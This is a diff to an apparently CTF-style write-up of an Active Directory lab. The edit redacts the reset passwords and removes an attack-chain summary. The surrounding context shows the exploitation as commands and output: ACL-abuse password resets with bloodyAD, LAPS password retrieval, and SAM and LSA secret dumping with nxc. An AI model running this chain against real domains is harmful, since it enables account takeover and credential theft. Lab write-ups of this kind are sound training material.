@@ -26,7 +26,6 @@ For the purposes of this evaluation, you will be provided the assigned credentia
 |----------|----------|
 | hellyr | [REDACTED] |
 
-**Platform:** HackSmarter
 **Difficulty:** Medium
 **OS:** Windows Server 2025
 
@@ -588,8 +587,8 @@ RHOSTS        10.1.250.54          yes        Domain Controller IP
 TARGET_USER                        yes        Target user to reset password
 USER          INTRANETSVC          yes        Username with ACL permissions
 
-UwU Toolkit bloody_setpass > setg NEW_PASS Password123
-NEW_PASS => Password123 (global)
+UwU Toolkit bloody_setpass > setg NEW_PASS [REDACTED]
+NEW_PASS => [REDACTED] (global)
 UwU Toolkit bloody_setpass > set TARGET_USER marks
 TARGET_USER => marks
 UwU Toolkit bloody_setpass > run
@@ -598,13 +597,13 @@ UwU Toolkit bloody_setpass > run
 [*] Domain: lumons.hacksmarter
 [*] Attacking User: INTRANETSVC
 [*] Target User: marks
-[*] New Password: Password123
+[*] New Password: [REDACTED]
 [*] Command: bloodyAD -u INTRANETSVC -p [HIDDEN] -d lumons.hacksmarter --host 10.1.250.54 set password marks [HIDDEN]
 [+] Password changed successfully!
-[+] New credentials: marks:Password123
+[+] New credentials: marks:[REDACTED]
 [*] Next steps:
 [*] setg USER marks
-[*] setg PASS Password123
+[*] setg PASS [REDACTED]
 [+] Module completed successfully
 
 UwU Toolkit bloody_setpass > set TARGET_USER peterk
@@ -615,13 +614,13 @@ UwU Toolkit bloody_setpass > run
 [*] Domain: lumons.hacksmarter
 [*] Attacking User: INTRANETSVC
 [*] Target User: peterk
-[*] New Password: Password123
+[*] New Password: [REDACTED]
 [*] Command: bloodyAD -u INTRANETSVC -p [HIDDEN] -d lumons.hacksmarter --host 10.1.250.54 set password peterk [HIDDEN]
 [+] Password changed successfully!
-[+] New credentials: peterk:Password123
+[+] New credentials: peterk:[REDACTED]
 [*] Next steps:
 [*] setg USER peterk
-[*] setg PASS Password123
+[*] setg PASS [REDACTED]
 [+] Module completed successfully
 ```
 
@@ -655,7 +654,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
 Then use Impacket to dump the LAPS password:
 
 ```
-Exegol > GetLAPSPassword.py lumons.hacksmarter/marks:Password123 -dc-ip 10.1.250.54
+Exegol > GetLAPSPassword.py lumons.hacksmarter/marks:[REDACTED] -dc-ip 10.1.250.54
 Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies
 
 Host       LAPS Username  LAPS Password              LAPS Password Expiration  LAPSv2
@@ -683,15 +682,15 @@ The command completed successfully.
 Now we can use nxc or secretsdump to dump the SAM and LSA:
 
 ```
-Exegol > nxc smb 10.1.188.43 -u marks -p 'Password123'
+Exegol > nxc smb 10.1.188.43 -u marks -p '[REDACTED]'
 SMB 10.1.188.43 445 INTRANET [*] Windows 11 / Server 2025 Build 26100 x64 (name:INTRANET)
 (domain:lumons.hacksmarter) (signing:False) (SMBv1:None)
-SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\marks:Password123 (admin)
+SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\marks:[REDACTED] (admin)
 
-Exegol > nxc smb 10.1.188.43 -u marks -p 'Password123' --sam
+Exegol > nxc smb 10.1.188.43 -u marks -p '[REDACTED]' --sam
 SMB 10.1.188.43 445 INTRANET [*] Windows 11 / Server 2025 Build 26100 x64 (name:INTRANET)
 (domain:lumons.hacksmarter) (signing:False) (SMBv1:None)
-SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\marks:Password123 (admin)
+SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\marks:[REDACTED] (admin)
 SMB 10.1.188.43 445 INTRANET [*] Dumping SAM hashes
 SMB 10.1.188.43 445 INTRANET Administrator:500:[HASH REDACTED]:::
 SMB 10.1.188.43 445 INTRANET Guest:501:[HASH REDACTED]:::
@@ -700,10 +699,10 @@ SMB 10.1.188.43 445 INTRANET WDAGUtilityAccount:504:[HASH REDACTED]:::
 SMB 10.1.188.43 445 INTRANET localadmin:1003:[HASH REDACTED]:::
 SMB 10.1.188.43 445 INTRANET [+] Added 5 SAM hashes to the database
 
-Exegol > nxc smb 10.1.188.43 -u marks -p 'Password123' --lsa
+Exegol > nxc smb 10.1.188.43 -u marks -p '[REDACTED]' --lsa
 SMB 10.1.188.43 445 INTRANET [*] Windows 11 / Server 2025 Build 26100 x64 (name:INTRANET)
 (domain:lumons.hacksmarter) (signing:False) (SMBv1:None)
-SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\marks:Password123 (admin)
+SMB 10.1.188.43 445 INTRANET [+] lumons.hacksmarter\marks:[REDACTED] (admin)
 SMB 10.1.188.43 445 INTRANET [+] Dumping LSA secrets
 SMB 10.1.188.43 445 INTRANET LUMONS.HACKSMARTER/IntranetSvc:[DCC2 HASH REDACTED]: (2026-01-23 21:46:31)
 SMB 10.1.188.43 445 INTRANET LUMONS.HACKSMARTER/hellye:[DCC2 HASH REDACTED]: (2025-11-07 01:31:10)
@@ -740,41 +739,6 @@ Connection to 172.17.0.1 closed.
 Now we can RDP as hellye and own the domain:
 
 ![DC01 Root Flag](/assets/images/ctf/lumon/dc01-root.png)
-
----
-
-## Attack Chain Summary
-
-```
-Phase 1 - Initial Access
-─────────────────────────────────────
-hellyr       : [REDACTED]         → Starting credentials
-
-Phase 2 - NTLM Coercion (MDRepo Share)
-─────────────────────────────────────
-harmonyc     : [REDACTED]            → Hash captured via ntlm_theft in MDRepo
-
-Phase 3 - Web Application Exploitation
-─────────────────────────────────────
-intranetsvc  : [REDACTED]     → Hash captured via command injection coercion
-
-Phase 4 - ACL Abuse (ForceChangePassword)
-─────────────────────────────────────
-marks        : Password123          → Password reset via intranetsvc
-peterk       : Password123          → Password reset via intranetsvc
-
-Phase 5 - LAPS Exploitation
-─────────────────────────────────────
-localadmin   : [REDACTED] → LAPS password via marks (LAPSADMINS)
-
-Phase 6 - Credential Dumping
-─────────────────────────────────────
-hellye (DCC2): [REDACTED]      → Cached credentials from LSA dump
-
-Phase 7 - Domain Compromise
-─────────────────────────────────────
-hellye       : [REDACTED]      → Domain Admin - DOMAIN OWNED
-```
 
 ---
 
